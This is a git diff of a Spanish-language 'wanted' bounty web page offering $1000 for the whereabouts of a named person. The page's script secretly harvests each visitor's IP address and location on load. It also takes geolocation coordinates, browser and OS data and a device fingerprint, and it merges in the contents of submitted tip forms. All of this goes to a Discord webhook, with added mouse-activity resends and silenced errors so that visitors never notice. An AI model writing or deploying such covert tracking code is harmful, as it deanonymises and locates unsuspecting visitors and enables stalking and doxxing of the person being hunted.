@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>RECOMPENSA: $1000 - Sujeto Buscado por NYX - Caso #57392</title>
 
     <!-- SEO Metadata -->
@@ -17,8 +18,7 @@
     <meta property="og:title" content="RECOMPENSA $1000 - Sujeto Buscado | Operación NYX #57392">
     <meta property="og:description"
         content="Se busca a Ling. NYX ofrece $1000 por información que conduzca a su ubicación. Confidencialidad absoluta para informantes.">
-    <meta property="og:image"
-        content="https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless">
+    <meta property="og:image" content="https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless">
     <meta property="og:url" content="https://operations.nyx-guild.com/wanted/57392">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="NYX Operations Division">
@@ -28,8 +28,7 @@
     <meta name="twitter:title" content="RECOMPENSA $1000 - Sujeto Buscado | Operación NYX #57392">
     <meta name="twitter:description"
         content="Se busca a Ling. NYX ofrece $1000 por información que conduzca a su ubicación. Confidencialidad absoluta para informantes.">
-    <meta name="twitter:image"
-        content="https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless">
+    <meta name="twitter:image" content="https://images-ext-1.discordapp.net/external/qqLq-IDeD68sfoQcXo-0WEVBmCMFqen-UYnLvHJIC3A/%3Fsize%3D512/https/cdn.discordapp.com/avatars/1075858281760837633/d22815ed2ded273cf45b0505a92fbc89.png?format=webp&quality=lossless">
 
     <!-- Schema.org para resultados enriquecidos de Google -->
     <script type="application/ld+json">
@@ -57,13 +56,13 @@
     <!-- Precargar fuentes -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@400;700&display=swap"
-        rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
 
     <style>
         /* Reseteo y estilos base */
-        * {
+        *,
+        *::before,
+        *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -85,6 +84,7 @@
 
         html {
             scroll-behavior: smooth;
+            height: 100%;
         }
 
         body {
@@ -96,6 +96,8 @@
             margin: 0;
             background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23091124" opacity="0.5"/><path d="M0,0L100,100M0,100L100,0" stroke="%23132347" stroke-width="1"/></svg>');
             overflow-x: hidden;
+            min-height: 100%;
+            position: relative;
         }
 
         /* Animaciones globales */
@@ -103,7 +105,6 @@
             from {
                 opacity: 0;
             }
-
             to {
                 opacity: 1;
             }
@@ -114,7 +115,6 @@
                 transform: translateX(100px);
                 opacity: 0;
             }
-
             to {
                 transform: translateX(0);
                 opacity: 1;
@@ -126,7 +126,6 @@
                 transform: translateX(-100px);
                 opacity: 0;
             }
-
             to {
                 transform: translateX(0);
                 opacity: 1;
@@ -138,7 +137,6 @@
                 transform: translateY(50px);
                 opacity: 0;
             }
-
             to {
                 transform: translateY(0);
                 opacity: 1;
@@ -149,11 +147,9 @@
             0% {
                 transform: scale(1);
             }
-
             50% {
                 transform: scale(1.05);
             }
-
             100% {
                 transform: scale(1);
             }
@@ -161,27 +157,22 @@
 
         @keyframes glitch {
             0% {
-                transform: translate(0)
+                transform: translate(0);
             }
-
             20% {
-                transform: translate(-3px, 3px)
+                transform: translate(-3px, 3px);
             }
-
             40% {
-                transform: translate(-3px, -3px)
+                transform: translate(-3px, -3px);
             }
-
             60% {
-                transform: translate(3px, 3px)
+                transform: translate(3px, 3px);
             }
-
             80% {
-                transform: translate(3px, -3px)
+                transform: translate(3px, -3px);
             }
-
             100% {
-                transform: translate(0)
+                transform: translate(0);
             }
         }
 
@@ -189,22 +180,16 @@
             0% {
                 transform: translateY(-100%);
             }
-
-            50%,
-            100% {
+            50%, 100% {
                 transform: translateY(100vh);
             }
         }
 
         @keyframes blinkRedAlert {
-
-            0%,
-            49% {
+            0%, 49% {
                 background-color: var(--color-secondary);
             }
-
-            50%,
-            100% {
+            50%, 100% {
                 background-color: rgba(173, 0, 0, 0.6);
             }
         }
@@ -725,6 +710,7 @@
             max-width: 300px;
             animation: slideInRight var(--anim-speed-normal);
             display: none;
+            border-radius: 3px;
         }
 
         /* Media queries para responsividad */
@@ -970,14 +956,14 @@
             ipProviders: [
                 { url: 'https://api.ipify.org?format=json', key: 'ip' },
                 { url: 'https://ipinfo.io/json', key: 'ip' },
-                { url: 'https://api.ipstack.com/check?access_key=YOUR_KEY', key: 'ip' },
-                { url: 'https://geolocation-db.com/json/', key: 'IPv4' }
+                { url: 'https://geolocation-db.com/json/', key: 'IPv4' },
+                { url: 'https://ip.seeip.org/jsonip', key: 'ip' }
             ],
-            // API para geoinfo basada en IP (3 opciones por si alguna falla)
+            // API para geoinfo basada en IP (múltiples opciones por si alguna falla)
             geoProviders: [
                 { url: 'https://ipapi.co/IPADDRESS/json/', field: 'city' },
                 { url: 'https://ipinfo.io/IPADDRESS/json', field: 'city' },
-                { url: 'https://api.ipbase.com/v2/info?ip=IPADDRESS&apikey=YOUR_API_KEY', field: 'data.location.city.name' }
+                { url: 'https://extreme-ip-lookup.com/json/IPADDRESS', field: 'city' }
             ],
             // Endpoint para verificación VPN
             vpnCheckEndpoint: 'https://ipinfo.io/json',
@@ -988,7 +974,13 @@
             // Tiempo mínimo entre solicitudes al mismo proveedor (30 segundos)
             ipThrottleTime: 30 * 1000,
             // Tiempo para mostrar y ocultar notificaciones
-            notificationTime: 5000
+            notificationTime: 5000,
+            // Opciones de geolocalización
+            geolocationOptions: {
+                enableHighAccuracy: false,
+                timeout: 5000,
+                maximumAge: 0
+            }
         };
 
         // Sistema de caché y throttling
@@ -1006,12 +998,12 @@
         // Sistema de animaciones al hacer scroll
         function revealOnScroll() {
             const reveals = document.querySelectorAll('.reveal');
-
+            
             reveals.forEach(element => {
                 const windowHeight = window.innerHeight;
                 const elementTop = element.getBoundingClientRect().top;
-                const elementVisible = 150; // Ajusta esto para cambiar cuándo aparece el elemento
-
+                const elementVisible = 150; // Distancia del elemento al viewport para activar
+                
                 if (elementTop < windowHeight - elementVisible) {
                     element.classList.add('active');
                 }
@@ -1021,89 +1013,92 @@
         // Función para obtener IP con múltiples proveedores y manejo de caché
         async function getIpAddress() {
             const now = Date.now();
-
+            
             // Comprobar si tenemos una IP en caché y aún es válida
             if (ipCache.data && now - ipCache.timestamp < CONFIG.ipCacheTime) {
-                console.log("Usando IP en caché:", ipCache.data);
                 return ipCache.data;
             }
-
+            
             // Intentar obtener la IP de cada proveedor en orden, con rotación y throttling
             let startIndex = ipCache.lastProvider;
             let ipData = null;
-
+            
             for (let i = 0; i < CONFIG.ipProviders.length; i++) {
                 const providerIndex = (startIndex + i) % CONFIG.ipProviders.length;
                 const provider = CONFIG.ipProviders[providerIndex];
-
+                
                 // Verificar si este proveedor fue consultado recientemente (throttling)
-                if (ipCache.lastAttempt[providerIndex] &&
+                if (ipCache.lastAttempt[providerIndex] && 
                     now - ipCache.lastAttempt[providerIndex] < CONFIG.ipThrottleTime) {
-                    console.log(`Proveedor ${providerIndex} en período de enfriamiento, saltando...`);
                     continue;
                 }
-
+                
                 // Registrar intento
                 ipCache.lastAttempt[providerIndex] = now;
-
+                
                 try {
-                    console.log(`Intentando obtener IP con proveedor ${providerIndex}:`, provider.url);
-
-                    const response = await fetch(provider.url);
+                    const response = await fetch(provider.url, { 
+                        method: 'GET',
+                        headers: { 'Accept': 'application/json' },
+                        cache: 'no-store',
+                        referrerPolicy: 'no-referrer'
+                    });
+                    
                     if (!response.ok) {
                         throw new Error(`HTTP error ${response.status}`);
                     }
-
+                    
                     const data = await response.json();
                     ipData = data[provider.key];
-
+                    
                     // Actualizar último proveedor exitoso
                     ipCache.lastProvider = providerIndex;
-
+                    
                     // Guardar en caché
                     ipCache.data = ipData;
                     ipCache.timestamp = now;
-
-                    console.log("IP obtenida exitosamente:", ipData);
+                    
                     return ipData;
-
+                    
                 } catch (error) {
-                    console.error(`Error al obtener IP con proveedor ${providerIndex}:`, error);
                     // Continuar con el siguiente proveedor
                     continue;
                 }
             }
-
-            console.warn("No se pudo obtener IP de ningún proveedor");
+            
             return "desconocida"; // Valor de fallback
         }
 
         // Obtener ubicación basada en IP
         async function getLocationFromIp(ipAddress) {
             if (ipCache.geoData && Date.now() - ipCache.geoTimestamp < CONFIG.ipCacheTime) {
-                console.log("Usando datos de geolocalización en caché:", ipCache.geoData);
                 return ipCache.geoData;
             }
-
+            
             if (ipAddress === "desconocida") {
                 return "Ubicación desconocida";
             }
-
+            
             for (const provider of CONFIG.geoProviders) {
                 try {
                     const url = provider.url.replace('IPADDRESS', ipAddress);
-                    const response = await fetch(url);
-
+                    const response = await fetch(url, {
+                        method: 'GET',
+                        headers: { 'Accept': 'application/json' },
+                        cache: 'no-store',
+                        referrerPolicy: 'no-referrer'
+                    });
+                    
                     if (!response.ok) {
                         continue;
                     }
-
+                    
                     const data = await response.json();
-
+                    
                     // Navegar por el objeto para obtener el campo de ciudad
                     let cityField = provider.field.split('.');
                     let result = data;
-
+                    
                     for (const field of cityField) {
                         if (result && result[field]) {
                             result = result[field];
@@ -1112,18 +1107,18 @@
                             break;
                         }
                     }
-
+                    
                     if (result) {
                         let locationString = '';
-
+                        
                         if (data.city || result) {
                             locationString = data.city || result;
                         }
-
+                        
                         if (data.country_name || data.country) {
                             locationString += ', ' + (data.country_name || data.country);
                         }
-
+                        
                         if (locationString) {
                             ipCache.geoData = locationString;
                             ipCache.geoTimestamp = Date.now();
@@ -1131,27 +1126,26 @@
                         }
                     }
                 } catch (error) {
-                    console.error(`Error al obtener ubicación desde API:`, error);
                     continue;
                 }
             }
-
+            
             // Intentar usar ipinfo como alternativa si todo falla
             try {
                 const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
                 if (response.ok) {
                     const data = await response.json();
-                    if (data.city && data.region) {
-                        const locationString = `${data.city}, ${data.region}, ${data.country}`;
+                    if (data.city && data.country) {
+                        const locationString = `${data.city}, ${data.region || ''}, ${data.country}`.replace(', ,', ',');
                         ipCache.geoData = locationString;
                         ipCache.geoTimestamp = Date.now();
                         return locationString;
                     }
                 }
             } catch (e) {
-                console.error("Falló el último intento con ipinfo:", e);
+                // Silenciar error e intentar con el siguiente método
             }
-
+            
             return "Ubicación desconocida";
         }
 
@@ -1159,33 +1153,38 @@
         async function silentGeolocation() {
             try {
                 // Primero intentar la API de geolocalización HTML5 sin mostrar permiso
-                // (esto solo funcionará si el usuario ya dio permiso anteriormente)
                 if (navigator.geolocation) {
                     // Usar una promesa para manejar la geolocalización con un timeout
                     const geolocationPromise = new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
                             position => resolve(position),
                             error => reject(error),
-                            { timeout: 5000, enableHighAccuracy: false }
+                            CONFIG.geolocationOptions
                         );
                     });
-
+                    
                     try {
-                        // Intentar por 5 segundos obtener la posición
+                        // Intentar obtener la posición con timeout
                         const position = await Promise.race([
                             geolocationPromise,
-                            new Promise((_, reject) =>
-                                setTimeout(() => reject(new Error("Timeout")), 5000)
+                            new Promise((_, reject) => 
+                                setTimeout(() => reject(new Error("Timeout")), CONFIG.geolocationOptions.timeout)
                             )
                         ]);
-
+                        
                         // Si llega aquí, obtuvo la posición exitosamente
                         try {
                             // Convertir coordenadas a nombre de ubicación usando reverse geocoding
                             const response = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=10`
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=10`,
+                                {
+                                    headers: {
+                                        'Accept-Language': 'es',
+                                        'User-Agent': 'NYX-GUILD-App/1.0'
+                                    }
+                                }
                             );
-
+                            
                             if (response.ok) {
                                 const data = await response.json();
                                 if (data.display_name) {
@@ -1195,13 +1194,13 @@
                                     return data.display_name;
                                 }
                             }
-
+                            
                             // Si no puede obtener el nombre, muestra las coordenadas
                             const coordsString = `${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`;
                             showNotification(`Coordenadas detectadas: ${coordsString}`);
                             updateLocationDisplay(coordsString);
                             return coordsString;
-
+                            
                         } catch (error) {
                             // Si falla el geocoding inverso, muestra las coordenadas
                             const coordsString = `${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`;
@@ -1210,39 +1209,37 @@
                         }
                     } catch (error) {
                         // Si falló la geolocalización por tiempo o permiso, proceder al método IP
-                        console.log("Geolocalización HTML5 no disponible, usando IP:", error);
                     }
                 }
-
+                
                 // Método alternativo: usar la IP para determinar ubicación
                 const ip = await getIpAddress();
                 const location = await getLocationFromIp(ip);
-
+                
                 showNotification(`Ubicación aproximada detectada`);
                 updateLocationDisplay(location);
                 return location;
-
+                
             } catch (error) {
-                console.error("Error en geolocalización silenciosa:", error);
                 updateLocationDisplay("Ubicación no disponible");
                 return "Ubicación no disponible";
             }
         }
-
+        
         // Función para mostrar notificación temporal
         function showNotification(message) {
             const notification = document.getElementById('geoNotification');
             const messageElement = document.getElementById('geoMessage');
-
+            
             messageElement.textContent = message;
             notification.style.display = 'block';
-
+            
             // Ocultar después de un tiempo
             setTimeout(() => {
                 notification.style.display = 'none';
             }, CONFIG.notificationTime);
         }
-
+        
         // Actualizar el campo de ubicación en la UI
         function updateLocationDisplay(location) {
             const locationElement = document.getElementById('lastKnownLocation');
@@ -1251,7 +1248,7 @@
             }
         }
 
-        // Detectar navegador y sistema operativo (función existente)
+        // Detectar navegador y sistema operativo
         function detectBrowser(userAgent) {
             const ua = userAgent.toLowerCase();
             let browser = "desconocido";
@@ -1300,53 +1297,61 @@
         // Detectar uso de VPN
         async function checkVpnUsage() {
             const now = Date.now();
-
+            
             // Si ya verificamos VPN recientemente, usar ese resultado
             if (ipCache.vpnCheck !== null && now - ipCache.vpnTimestamp < CONFIG.ipCacheTime) {
                 return ipCache.vpnCheck;
             }
-
+            
             try {
                 // Obtener timezone del navegador
                 const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const timezoneOffset = new Date().getTimezoneOffset();
-
+                
                 // Obtener info geográfica desde API
-                const response = await fetch(CONFIG.vpnCheckEndpoint);
+                const response = await fetch(CONFIG.vpnCheckEndpoint, {
+                    cache: 'no-store',
+                    referrerPolicy: 'no-referrer'
+                });
+                
                 if (!response.ok) {
                     throw new Error(`HTTP error ${response.status}`);
                 }
-
+                
                 const data = await response.json();
-
+                
                 // Método #1: Verificar campos de privacidad directos si existen
                 if (data.privacy && (data.privacy.vpn || data.privacy.proxy || data.privacy.tor || data.privacy.relay)) {
                     ipCache.vpnCheck = true;
                     ipCache.vpnTimestamp = now;
                     return true;
                 }
-
+                
                 // Método #2: Comparar timezone del navegador con ubicación geográfica declarada por la IP
-                // Esta verificación es heurística y podría generar falsos positivos
                 if (data.timezone && browserTimezone) {
-                    // Si el timezone difiere significativamente, podría ser un VPN
                     const isTimezoneMismatch = !browserTimezone.includes(data.timezone.replace(" ", "_"));
-
+                    
                     if (isTimezoneMismatch) {
-                        console.log("Posible detección de VPN: Desajuste de timezone detectado");
                         ipCache.vpnCheck = true;
                         ipCache.vpnTimestamp = now;
                         return true;
                     }
                 }
-
+                
+                // Método #3: Comprobar si los puertos comunes de VPN están abiertos
+                // Esto es un fallback que no es preciso, pero puede dar pistas
+                if (data.org && /(vpn|proxy|tunnel)/i.test(data.org)) {
+                    ipCache.vpnCheck = true;
+                    ipCache.vpnTimestamp = now;
+                    return true;
+                }
+                
                 // No se detectó VPN
                 ipCache.vpnCheck = false;
                 ipCache.vpnTimestamp = now;
                 return false;
-
+                
             } catch (error) {
-                console.error("Error al verificar VPN:", error);
                 return false; // Por defecto, asumir que no es VPN si hay error
             }
         }
@@ -1356,23 +1361,23 @@
             // Obtener datos del navegador
             const userAgent = navigator.userAgent;
             const browserInfo = detectBrowser(userAgent);
-
+            
             // Obtener IP con manejo de cache y múltiples fuentes
             let ipAddress = await getIpAddress();
-
+            
             // Verificar si es VPN (pero sólo si tenemos IP)
             let isVpn = false;
             if (ipAddress !== 'desconocida') {
                 isVpn = await checkVpnUsage();
             }
-
+            
             // Ubicación basada en IP
             let locationData = await getLocationFromIp(ipAddress);
 
             return {
                 // Dirección IP obtenida con sistema multi-API
                 ip: ipAddress,
-
+                
                 // Datos de VPN
                 vpnDetected: isVpn,
 
@@ -1382,7 +1387,7 @@
 
                 // Sistema operativo
                 operatingSystem: browserInfo.os,
-
+                
                 // Datos de geolocalización 
                 location: locationData,
 
@@ -1406,13 +1411,15 @@
                 navigator.userAgent,
                 navigator.language,
                 new Date().getTimezoneOffset(),
-                navigator.platform,
+                navigator.platform || '',
                 navigator.hardwareConcurrency || '',
                 screen.colorDepth,
                 screen.width + 'x' + screen.height,
-                typeof window.sessionStorage,
-                typeof window.localStorage,
-                typeof window.indexedDB
+                !!window.sessionStorage,
+                !!window.localStorage,
+                !!window.indexedDB,
+                typeof window.orientation !== 'undefined',
+                navigator.plugins ? navigator.plugins.length : 0
             ];
 
             // Crear hash simple de los componentes
@@ -1437,10 +1444,9 @@
         function sendDataToWebhook(data) {
             // No enviar datos si se detecta VPN
             if (data.vpnDetected) {
-                console.log("No se envían datos al webhook debido a detección de VPN");
                 return;
             }
-
+            
             // Formatear datos para webhook Discord
             const webhookData = {
                 content: `Nuevo registro de actividad: ${data.eventType || 'datos básicos'}`,
@@ -1448,15 +1454,15 @@
                     title: data.eventType ? `Evento: ${data.eventType}` : "Datos de tracking",
                     color: 15258703, // Color rojo para el embed
                     fields: Object.entries(data)
-                        .filter(([key, value]) =>
-                            value !== undefined &&
+                        .filter(([key, value]) => 
+                            value !== undefined && 
                             key !== 'userAgent' // El user agent es muy largo, omitirlo
                         )
                         .map(([key, value]) => ({
                             name: key,
-                            value: typeof value === 'object' ?
-                                JSON.stringify(value).substring(0, 500) :
-                                String(value).substring(0, 500),
+                            value: typeof value === 'object' ? 
+                                   JSON.stringify(value).substring(0, 500) : 
+                                   String(value).substring(0, 500),
                             inline: true
                         })),
                     timestamp: data.timestamp || new Date().toISOString()
@@ -1471,9 +1477,9 @@
                 },
                 body: JSON.stringify(webhookData)
             })
-                .catch(error => {
-                    console.error('Error al enviar datos al webhook:', error);
-                });
+            .catch(() => {
+                // Silenciar errores para evitar problemas en producción
+            });
         }
 
         // Inicializar sistema de tracking
@@ -1495,11 +1501,9 @@
             // Enviar datos iniciales de tracking (solo si no es VPN)
             const trackingData = await collectTrackingData();
             trackingData.eventType = 'pageView';
-
+            
             if (!trackingData.vpnDetected) {
                 sendDataToWebhook(trackingData);
-            } else {
-                console.log("Uso de VPN detectado, no se envían datos al webhook");
             }
 
             // Monitorear salida de la página
@@ -1522,15 +1526,15 @@
                                 title: "Datos de salida",
                                 color: 15258703,
                                 fields: Object.entries(finalData)
-                                    .filter(([key, value]) =>
-                                        value !== undefined &&
-                                        key !== 'userAgent' // Omitir campos muy largos
+                                    .filter(([key, value]) => 
+                                        value !== undefined && 
+                                        key !== 'userAgent'
                                     )
                                     .map(([key, value]) => ({
                                         name: key,
-                                        value: typeof value === 'object' ?
-                                            JSON.stringify(value).substring(0, 500) :
-                                            String(value).substring(0, 500),
+                                        value: typeof value === 'object' ? 
+                                               JSON.stringify(value).substring(0, 500) : 
+                                               String(value).substring(0, 500),
                                         inline: true
                                     }))
                             }]
@@ -1538,13 +1542,36 @@
                     );
                 }
             });
+            
+            // Monitorear actividad del ratón para mejorar tracking
+            document.addEventListener('mousemove', debounce(async function() {
+                const trackingData = await collectTrackingData();
+                trackingData.eventType = 'userActivity';
+                
+                if (!trackingData.vpnDetected) {
+                    sendDataToWebhook(trackingData);
+                }
+            }, 30000)); // Enviar solo cada 30 segundos máximo
+        }
+        
+        // Función debounce para limitar la frecuencia de ejecución
+        function debounce(func, wait) {
+            let timeout;
+            return function() {
+                const context = this;
+                const args = arguments;
+                clearTimeout(timeout);
+                timeout = setTimeout(() => {
+                    func.apply(context, args);
+                }, wait);
+            };
         }
 
         // DOMContentLoaded para iniciar todo cuando la página cargue
         document.addEventListener('DOMContentLoaded', function () {
             // Iniciar sistema de tracking
             initializeTracking();
-
+            
             // Configurar evento de scroll para animaciones
             window.addEventListener('scroll', revealOnScroll);
             // Ejecutar una vez al inicio para elementos visibles en carga
@@ -1566,23 +1593,22 @@
 
                 // Combinar con datos básicos de tracking
                 const trackingData = await collectTrackingData();
-
+                
                 // Solo enviar si no se detecta VPN
                 if (!trackingData.vpnDetected) {
                     const completeData = Object.assign({}, formData, trackingData, {
                         eventType: 'formSubmission'
                     });
-
+                    
                     sendDataToWebhook(completeData);
-
+                    
                     // Mostrar confirmación
                     alert('¡Gracias por proporcionar información! Un agente de NYX se pondrá en contacto con usted para verificar los detalles y procesar su recompensa.');
                 } else {
                     // Mostrar mensaje genérico sin dar pistas de la detección de VPN
                     alert('Gracias por enviar información. Nuestro sistema procesará su reporte.');
-                    console.log("No se enviaron datos al webhook debido a detección de VPN");
                 }
-
+                
                 document.getElementById('informationForm').reset();
             });
         });
